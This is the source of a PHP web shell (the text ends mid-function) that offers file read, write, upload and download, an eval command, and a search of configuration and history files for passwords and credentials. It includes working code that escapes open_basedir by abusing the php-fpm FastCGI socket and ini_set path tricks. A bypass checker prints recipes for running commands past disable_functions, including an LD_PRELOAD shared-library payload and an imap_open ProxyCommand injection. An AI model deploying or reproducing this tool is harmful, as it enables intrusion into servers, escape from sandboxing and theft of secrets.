<?php
/**
 * There is nothing more frustrating that being able to execute PHP code while being constrained by open_basedir
 * and disable_functions
 * 
 * @author  Testeur de Stylos
 * @version 0.9
 */
ob_end_clean();

//Fastcgi class helper (slightly modified)
//--- BEGIN FILE COPY ---
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data[$p++]);
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data[$p++]) << 16);
                $nlen |= (ord($data[$p++]) << 8);
                $nlen |= (ord($data[$p++]));
            }
            $vlen = ord($data[$p++]);
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data[$p++]) << 16);
                $vlen |= (ord($data[$p++]) << 8);
                $vlen |= (ord($data[$p++]));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data[0]);
        $ret['type']          = ord($data[1]);
        $ret['requestId']     = (ord($data[2]) << 8) + ord($data[3]);
        $ret['contentLength'] = (ord($data[4]) << 8) + ord($data[5]);
        $ret['paddingLength'] = ord($data[6]);
        $ret['reserved']      = ord($data[7]);
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        fwrite($this->_sock, $request);
        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);
        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }
        switch (ord($resp['content'][4])) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}
// --- END FILE COPY

//error_reporting(E_ERROR | E_PARSE);
define("COMMANDS", [
  "?" => ": Display this",
  "cat" => " <file>: Read a file",
  "cd" => " <dir?>: Change current working directory",
  "chkbypass" => " <-k?> : Checks common bypass techniques. Use -k to skip versions check",
  "clear" => ": Clear the console",
  "download" => " <file>: Download given file",
  "echo" => "<what> >|>> <file>: Writes a string to a file. Creates/overwrites if '>', appends if '>>'",
  "env" => ": Show the environment variables",
  "eval" => " <code>: Execute given PHP code",
  "help" => ": Display this",
  "gethist" => ": Look for history files",
  "getpasswd" => " <path?>: Look for passwords",
  "grep" => " <pattern> <path?> <-i?>: Look for a specific pattern. Default is current directory",
  "id" => ": Give the current user id",
  "ls" => " <-R?> <path?>: List directory content",
  "mkdir" => " <path>: Create a directory. If there are non existent intermediary directories, creates the full path",
  "mv" => " <src> <dest>: Rename a file. Beware of quoted strings",
  "phpinfo" => ": Execute phpinfo routine",
  "ps" => ": Lists running processes",
  "pwd" => ": Get current working directory",
  "rm" => " <path>: Remove file or folder. Beware of quoted strings",
  "tar" => " <path?>: Creates a tar archive, and downloads it. Default is current directory",
  "upload" => " <outfile>: Upload a file, and give it a name",
]);

//list of extensions of file with potential password: reads and greps them
define("EXTENSIONS", [
  "txt",
  "xml",
  "php",
  "json",
  "yaml",
  "yml",
  "conf",
  "env",
  "cfg",
  "init",
  "cnf",
  "ini",
  "config"
]);

//list of potential interesting files. It lists but doesn't read them
define("INTERESTING_FILES", [
  "Dockerfile", ".htaccess", ".htpasswd", ".git-credentials"
]);

//Same but only based on extension
define("INTERESTING_EXTENSIONS", [
  "db", "env", "sqlite", "database", "sqlite3"
]);

//Needles while looking for passwords
define("NEEDLE_PASSWDS", [
  "passw", "pwd", "secret"
]);

//Some utils
if (!function_exists('str_starts_with')) {
  function str_starts_with(string $haystack, string $needle): bool{
    return (string)$needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;
  }
}
if (! function_exists('str_ends_with')) {
    function str_ends_with(string $haystack, string $needle): bool{
        $needle_len = strlen($needle);
        return ($needle_len === 0 || 0 === substr_compare($haystack, $needle, - $needle_len));
    }
}

//if these functions have been disabled, replace them by dummy ones
$functions = [];
if (!function_exists('posix_getgrgid')){
  $functions['posix_getgrgid'] = function ($x){return ["name" => "?"];};
}
else{
  $functions['posix_getgrgid'] = function ($x){return posix_getgrgid($x);};
}
if (!function_exists('posix_getpwuid')){
  $functions['posix_getpwuid'] = function ($x){return ["name" => "?", "uid" => "?", "gid" => "?"];};
}
else{
  $functions['posix_getpwuid'] = function ($x){return posix_getpwuid($x);};
}

if (!function_exists('ini_get')){
  if (function_exists('ini_get_all')){
    $functions['ini_get'] = function($x){
      $all = ini_get_all();
      if (isset($all[$x])){
        return $all[$x]["local_value"];
      }
      else{
        return false;
      }
    };
  }
  else{
    $functions['ini_get'] = function($x){return null;};
  }
}
else{
  $functions['ini_get'] = function($x){return ini_get($x);};
}

//https://stackoverflow.com/questions/4356289/php-random-string-generator
function generateRandomString($length = 10) {
  return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

/**
 * Helper that uses CGI to bypass open_basedir by overwriting a config. Unfortunately, it does not work with disable_functions, although phpinfo says that they are none
 * $getfile: The file to read
 */
function bypassThroughFCGI($getfile){
  if (!isset($_REQUEST['file'])) {
    $req = '/'.basename(__FILE__);
    $uri = $req .'?file='.$getfile;
    $code = "<?php echo \"\$\$\";echo file_get_contents(\$_REQUEST['file']);die();?>";
    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
    $params = array(
            'GATEWAY_INTERFACE' => 'FastCGI/1.0',
            'REQUEST_METHOD'    => 'POST',
            'SCRIPT_FILENAME'   => __FILE__,
            'SCRIPT_NAME'       => $req,
            'QUERY_STRING'      => 'file='.$getfile,
            'REQUEST_URI'       => $uri,
            'DOCUMENT_URI'      => $req,
            'PHP_VALUE'         => $php_value,
            'SERVER_SOFTWARE'   => '80sec/wofeiwo',
            'REMOTE_ADDR'       => '127.0.0.1',
            'REMOTE_PORT'       => '9985',
            'SERVER_ADDR'       => '127.0.0.1',
            'SERVER_PORT'       => '80',
            'SERVER_NAME'       => 'localhost',
            'SERVER_PROTOCOL'   => 'HTTP/1.1',
            'CONTENT_LENGTH'    => strlen($code)
            );
    $client = new FCGIClient("127.0.0.1:9000", -1);
    try{
        $resp = $client->request($params, $code)."\n";
    }
    catch(Exception $e){
        $client = new FCGIClient("unix:///var/run/php/php-fpm.sock", -1); //normally should be a symlink to real socket
        $resp = $client->request($params, $code)."\n";
    }
    if (isset($resp)){
        return $resp;
    }
    return null;
  }
  die();
}

/**
* If open_basedir is enforced, try to bypass it
* $cwd: Where to get back once done
* return: True if successful
**/
function bypass_openbasedir($cwd):bool{
  global $functions;
  $open_basedir = $functions['ini_get']('open_basedir');
  if ($open_basedir != null){
    if (!strcmp($open_basedir,"")) {
      chdir($cwd);
      return true;
    }
    if (function_exists('ini_set') || function_exists('ini_alter')){
      //maybe we could append dot-dot-slash. We assume that the current folder is writeable, since the shell is there
      $here = getcwd();
      $levels = substr_count($here, "/");
      $randpath = generateRandomString(5);
      $path = $randpath."/".str_repeat("x/", $levels - 1);
      if (mkdir($path, 0777, true)){
        chdir($path);
        if (function_exists("ini_alter")){
          ini_alter("open_basedir", $open_basedir.":./".str_repeat("../", $levels));
        }
        else{
          ini_set("open_basedir", $open_basedir.":./".str_repeat("../", $levels));
        }
        chdir($here);
        rrmdir($randpath);
        if (@file_get_contents("/etc/passwd")){
          chdir($cwd);
          return true;
        }

        /*else{
          //FIXME if previous trick is patched
          mkdir($path, 0777, true);
          symlink(getcwd()."/".$path,"foo");
          symlink("foo/".str_repeat("../", $levels),"bar");
          ini_set("open_basedir",ini_get("open_basedir").":bar/");
          unlink("foo");
          symlink($here,"foo");
          var_dump(file_get_contents("bar/etc/passwd"));
        }*/
      }
    }
    //try to see if cgi socket active
    if (!strcmp("fpm-fcgi", php_sapi_name()) || !strcmp("cgi-fcgi", php_sapi_name())){
      $etc_passwd = bypassThroughFCGI("/etc/passwd");
      if (strpos($etc_passwd, "root:")){
          chdir($cwd);
          return true;
      }
    }
  }
  chdir($cwd);
  return false;
}

/**
* Parses command line arguments, and returns them as array
* $operands: The command line arguments
* return: Parsed arguments as array
**/
function getArgs(string $operands): array {
  $ok = preg_match_all('/(?s)(?<!\\\\)("|\')(?:[^\\\\]|\\\\.)*?\1|\S+/mi', $operands, $matches);
  if ($ok && count($matches) > 0){
    $matches = $matches[0];
    $res = array();
    foreach ($matches as $match) {
      $m = str_replace("\\'", "'", $match);
      $m = str_replace('\\"', '"', $m);
      $m = str_replace('\\\\', '\\', $m);
      if (str_starts_with($m, "'") || str_starts_with($m, '"')){
        $m = substr($m, 1, -1);
      }
      array_push($res, $m);
    }
    return $res;
  }
  return [];
}

/**
* Recursively removes a directory, even if not empty
* $dir: The directory to be deleted
* return: True on success, False on failure
**/
function rrmdir(string $dir): bool {
 //copy-pasta: https://stackoverflow.com/questions/9760526/in-php-how-do-i-recursively-remove-all-folders-that-arent-empty
 if (is_dir($dir)) {
   $objects = scandir($dir);
   foreach ($objects as $object) {
     if ($object != "." && $object != "..") {
       if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
     }
   }
   reset($objects);
   return rmdir($dir);
 }
 return false;
}

/**
* Formats file permissions in rwx format
* $finfo: File path
* return: Formatted permissions
**/
function get_fperms(string $finfo): string {
  //thx https://www.php.net/manual/en/function.fileperms.php
  $perms = fileperms($finfo);
  switch ($perms & 0xF000) {
      case 0xC000: // socket
          $info = 's';
          break;
      case 0xA000: // symbolic link
          $info = 'l';
          break;
      case 0x8000: // regular
          $info = '-';
          break;
      case 0x6000: // block special
          $info = 'b';
          break;
      case 0x4000: // directory
          $info = 'd';
          break;
      case 0x2000: // character special
          $info = 'c';
          break;
      case 0x1000: // FIFO pipe
          $info = 'p';
          break;
      default: // unknown
          $info = 'u';
  }

  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}

/**
* Returns info about a file node: permissions, nb links, owner, group, size, modification time, and the path.
* Output should be similar to ls -l
* $xpath: The file path
* $expand: should the file path be the full one or not ?
* return: Array with the expected info
**/
function get_finfo(string $xpath, bool $expand = false): array {
  global $functions;
  $stat_info = stat($xpath);
  $fperms = get_fperms($xpath);
  $owner = $functions['posix_getpwuid']($stat_info["uid"])["name"];
  $group = $functions['posix_getgrgid']($stat_info["gid"])["name"];
  $nblinks = $stat_info[3];
  $size = $stat_info["size"];
  if (!$expand){
    //keep only the file name
    $idx = strrpos($xpath, "/");
    $xpath = substr($xpath, $idx + 1);
  }
  if (is_dir($xpath)){
    $mtime = date("M d H:i", $stat_info["mtime"]);
  }
  else{
    $mtime = date("M d  o", $stat_info["mtime"]);
  }
  return array($fperms, $nblinks, $owner, $group, $size, $mtime, $xpath);
};

/**
* Format the ls output with aligned columns
* $finfos: the info given by get_finfo
* $parent: the parent directory name, cuz it's displayed while executing ls -R
*
**/
function format_ls(array $finfos, string $parent = null): string {
  $out = $parent ? $parent.":\n" : "" ;
  $offsets= [];
  for ($i = 1; $i < 5; $i++){
    $longest = strlen($finfos[0][$i]);
    foreach ($finfos as $finfo) {
      if (strlen($finfo[$i]) > $longest){$longest = strlen($finfo[$i]);}
    }
    array_push($offsets, $longest);
  }
  foreach ($finfos as $finfo) {
    $out .= "$finfo[0] ".
            str_pad($finfo[1], $offsets[0], " ", STR_PAD_LEFT)." ".
            str_pad($finfo[2], $offsets[1], " ")." ".
            str_pad($finfo[3], $offsets[2], " ")." ".
            str_pad($finfo[4], $offsets[3], " ", STR_PAD_LEFT)." ".
            "$finfo[5] $finfo[6]\n";
  }
  return $out;
}

function format_array(array $items, int $nbcols): string{
  $longest_a = array();
  for($i = 0; $i < $nbcols; $i++){
    $longest = 0;
    for($j = $i; $j < count($items); $j+=$nbcols){
      if (strlen($items[$j]) > $longest){ $longest = strlen($items[$j]); }
    }
    array_push($longest_a, $longest + 3);
  }
  $out = "";
  for($i = 0; $i < count($items); $i++){
    $modulo = $i % $nbcols;
    $out .= str_pad($items[$i], $longest_a[$modulo], " ");
    if ($modulo == $nbcols -1 && $i != count($items) - 1){
      $out .= "\n";
    }
  }
  $out .= "\n";
  return $out;
}
/**
* Recursively scans a directory and returns **only files**
* $dir: The root directory
* $results: The output array, can be ignored while calling the routine
* return: The array containing all files
**/
function walk_dir(string $dir, array &$results = array()):array {
    //~copy pasta: https://stackoverflow.com/questions/24783862/list-all-the-files-and-folders-in-a-directory-with-php-recursive-function
    $files = scandir($dir, SCANDIR_SORT_ASCENDING);
    if (!$files){
      return $results;
    }
    foreach ($files as $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            walk_dir($path, $results);
        }
    }
    return $results;
}

/**
* Similar to walk_dir, but does it in the ls -R style. It builds the output string instead of returning the list of file
* $dir: The root directory
* $results: The list of directories to scan. Can be ignored
* return: The ls -R result
**/
function walk_dir_2(string $dir, array &$results = array()):string{
  if (!str_ends_with($dir, "/")){
    $dir .= "/";
  }
  $files = @scandir($dir, SCANDIR_SORT_ASCENDING);
  $finfos = [];
  if ($files){
    foreach ($files as $f) {
      array_push($finfos, get_finfo($dir.$f));
    }
    $out = format_ls($finfos, $dir);
    $localdirs = [];
    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if ($value != "." && $value != ".." && is_dir($path)) {
            array_push($localdirs, $path);
        }
    }
    foreach ($localdirs as $localdir) {
      $out .= "\n";
      $out .= walk_dir_2($localdir, $results);
    }
  }
  else{
    $out = "$dir: permission denied";
  }
  return $out;
}

/**
* Reads a file
* $path: The file path to read
* return: The file content or error message
**/
function doCat(string $path): string{
  if (is_file($path)){
    $content = file_get_contents($path);
    if ($content) {return $content;}
  }
  return "Error, cannot read file $path";
}

/**
* Changes current working directory
* $path: The target directory, or the HOME if empty
* return: Empty string if success, error message otherwise
**/
function doCd(string $path):string {
  if (!strlen($path)){
    $path = getenv("HOME");
    if ($path === false){ return "Error, HOME env variable is not set"; }
  }
  if (!chdir($path)){ return "Error, cannot cd in $path";}
  return "";
}

/**
* Function that tries to find disabled_functions evasion, to gain command exec
* $cmdline: Argument, maybe -k was passed
* return: Summary of  what was found
**/
function doChkbypass(string $cmdline):string{
  global $functions;
  $no_check_versions = !strcmp($cmdline, "-k");
  $mods = get_loaded_extensions();
  if (count($mods)){
    $out = "<span style='text-decoration: underline;'>Installed modules:</span>\n";
    $mods_versions = array_fill(0, count($mods), null);
    for ($i=0; $i < count($mods); $i++) {
      preg_match("#\d+(\.\d+)*#", phpversion($mods[$i]), $match);
      $mods_versions[$i] = $mods[$i]." (".$match[0].")";
    }
    $out .= format_array($mods_versions, 6)."\n";
  }
  else{
    $out = "No installed modules\n\n";
  }

  if (function_exists("apache_get_modules") && $mods = apache_get_modules() && count($mods)){
      $out .= "<span style='text-decoration: underline;'>Installed Appache modules:</span>\n";
      $mods_versions = array_fill(0, count($mods), null);
      for ($i=0; $i < count($mods); $i++) {
        preg_match("#\d+(\.\d+)*#", phpversion($mods[$i]), $match);
        $mods_versions[$i] = $mods[$i]." (".$match[0].")";
      }
      $out .= format_array($mods_versions, 6)."\n";
  }
  else{
    $out .= "No installed Apache modules\n\n";
  }
  $disable_functions = $functions['ini_get']('disable_functions');
  if ($disable_functions == null){
    $out .= "<span style='font-style: italic;'>Could not find disable_functions, because ini_get is disabled...</span>\n\n";
  }
  else{
    $disabled = explode(",",$disable_functions );
    if (count($disabled) && strlen($disabled[0])){
      $out .= "<span style='text-decoration: underline;'>Disabled functions:</span>\n";
      $out .= format_array($disabled, 6)."\n";
    }
    else{
      $out .= "<span style='color:red;'>No disabled functions</span>\n\n";
    }
  }
  $tmp = [];
  foreach (['exec', 'passthru', 'system', 'shell_exec', 'popen', 'proc_open'] as $shellable) {
    if (function_exists($shellable)){
      array_push($tmp, $shellable);
    }
  }
  if (count($tmp)) {
    $out .= "<span style='text-decoration: underline;color:red;'>Following routines can be used to execute shell commands:</span>\n- ";
    $out .= implode("\n- ", $tmp)."\n\n";
  }
  $tmp = [];
  if (function_exists("pcntl_exec")){
    array_push($tmp, "- <span style='color:red;'>pcntl_exec</span> is enabled and can be used to execute shell commands: <span style='font-style:italic;color:blue;'>echo pcntl_exec('/absolute/path/to/bin');</span>");
  }
  if (function_exists("dl")){
    array_push($tmp, "- <span style='color:red;'>dl</span> is enabled and can be used to load custom extensions.\n\tSee <a style='font-style:italic;color:blue;' target=_blank href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-dl-function'>https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-dl-function</a>.");
  }
  if (function_exists("putenv")){
    $tmp1 = [];
    $evilfuncs = ["mail", "mb_send_mail", "error_log", "imap_mail", "libvirt_connect", "gnupg_init"];
    foreach ($evilfuncs as $x) {
      if (function_exists($x)){array_push($tmp1, $x);}
    }
    if (count($tmp1)){
      $msg = "- <span style='color:red;'>putenv</span> is enabled and can be used to corrupt environment variables, such as LD_PRELOAD. This can be used with the following routines: <span style='font-style:italic;color:blue;'>".implode("</span>, <span style='font-style:italic;color:blue;'>", $tmp1)."</span>.\n";
      $msg .= "\tFirst compile the following C snippet as a shared library (example.so):\n<span style='font-style:italic;color:blue;'>
\t#define  _GNU_SOURCE
\t#include <stdlib.h>

\t__attribute__ ((__constructor__)) void preloadme(void) {
\t\tunsetenv(\"LD_PRELOAD\");
\t\tsystem(getenv(\"COMMAND\"));
\t}</span>\n";
      $msg .= "\n\tThen run the following PHP code:<span style='font-style:italic;color:blue;'>\n\n\tputenv('COMMAND=&lt;command goes here&gt;');\n\tputenv('LD_PRELOAD=/absolute/path/to/example.so');\n\terror_log('', 1, 'example@example.com');//or mail, mb_send_mail, imap_mail...</span>";
      array_push($tmp, $msg);
    }
  }
  if (function_exists("imap_open")){
    array_push($tmp, "- <span style='color:purple;'>imap_open</span> is enabled and depending on versions, it could be used to bypass <b>rsh</b> by appending arguments.\n\tTo test, run the following PHP code:\n\n\t<span style='font-style:italic;color:blue;'>\$server = 'x -oProxyCommand=echo &lt;base64'ed command&gt;|base64 -d|sh}';\n\timap_open('{'.\$server.':143/imap}INBOX', '', '');</span>");
  }
  if ($no_check_versions || (version_compare(PHP_VERSION, '7.0') > 0 && version_compare(PHP_VERSION, '7.3.10') < 1 )){
    array_push($tmp, "- <span style='color:red;'>gc_collect_cycles</span> in versions PHP 7.0 - 7.3 (Unix) could be abused to execute arbitrary commands.\n\tSee <a style='font-style:italic;color:blue;' href='https://www.exploit-db.com/exploits/47462' target=_blank >https://www.exploit-db.com/exploits/47462</a> for details about vulnerable versions.");
  }
  if ($no_check_versions || (class_exists("Imagick") && version_compare('5.4', PHP_VERSION) < 1)){
    if ($no_check_versions || version_compare(phpversion('imagick'), '3.3') < 1){
      array_push($tmp, "- <span style='color:red;'>Imagick</span> class is enabled and can be abused to bypass disabled functions.\n\tSee <a style='font-style:italic;color:blue;' href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit' target=_blank >https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit</a>.");
    }
  }
  if(extension_loaded('perl')){
    array_push($tmp, "- Extension <span style='color:red;'>perl</span> is loaded, it may be used to evade PHP.\n\tTo test, try to run something like:\n\n\t<span style='font-style:italic;color:blue;'>\$perl=new perl();\n\t\$perl->eval(\"system('&lt;command&gt;')\");</span>");
  }
  if ($no_check_versions || ((version_compare('7.0', PHP_VERSION) < 1 && version_compare(PHP_VERSION, '7.3.15') < 0) || (version_compare('7.4', PHP_VERSION) < 1 && version_compare(PHP_VERSION, '7.4.3') < 0))){
    array_push($tmp, "- PHP version could be vulnerable to a UAF leading to bypass, because of <span style='color:red;'>debug_backtrace</span>.\n\tSee <a style='font-style:italic;color:blue;' href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only#php-7-0-7-4-nix-only' target=_blank >https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only#php-7-0-7-4-nix-only</a>");
  }
  if ($no_check_versions || ((version_compare('5.0', PHP_VERSION) < 1 && version_compare(PHP_VERSION, '6') < 0))){
    array_push($tmp, "- PHP version could be vulnerable to <span style='color:red;'>Shellshock</span>.\n\tSee <a style='font-style:italic;color:blue;' href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-php-5.x-shellshock-exploit' target=_blank >https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-php-5.x-shellshock-exploit</a>");
  }
  if ($no_check_versions || ((version_compare('5', PHP_VERSION) < 1 && version_compare(PHP_VERSION, '7.4.26') < 0) || (version_compare('8', PHP_VERSION) < 1 && version_compare(PHP_VERSION, '8.0.13') < 0))){
    array_push($tmp, "- PHP version could be vulnerable to memory corruption leading to bypass, because of <span style='color:red;'>php_user_filter</span>.\n\tSee <a style='font-style:italic;color:blue;' href='https://github.com/mm0r1/exploits/tree/master/php-filter-bypass' target=_blank >https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a>");
  }
  if(extension_loaded('cgi-fcgi') && function_exists('fpm_get_status')){
    array_push($tmp, "- Module <span style='color:red;'>cgi-fcgi</span> is enabled, and could be abused to bypass <b>open_basedir</b> and <b>disable_functions</b> restrictions. \n\tSee <a style='font-style:italic;color:blue;' href='https://github.com/BorelEnzo/FuckFastcgi' target=_blank >https://github.com/BorelEnzo/FuckFastcgi</a>\n\n\tBrowsing to the FuckFastCGI PHP exploit file while passing the argument <tt>cmd</tt> should work.");
  }
  if (class_exists("FFI") && !strcmp($functions['ini_get']("ffi.enable"), "1")){
